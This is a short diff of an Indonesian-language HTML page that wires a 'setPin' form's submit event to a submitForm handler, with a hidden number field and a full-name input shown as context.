@@ -1058,7 +1058,7 @@ body.stop-scrolling {
   <div class="container-3 w-container">
    <div class="form-block w-form">
  
- <form id="setPin" onsubmit="">
+ <form id="setPin" onsubmit="submitForm(event); return false">
   <input type="hidden" id="nomorku" name="nomorku" value="">	
      <label for="nama">Nama Lengkap</label>
      <input type="text" name="nama" id="nama" class="text-field-2 w-input" maxlength="200" data-name="Nomor Handphone" placeholder="Tuliskan Nama Lengkap Anda" required>
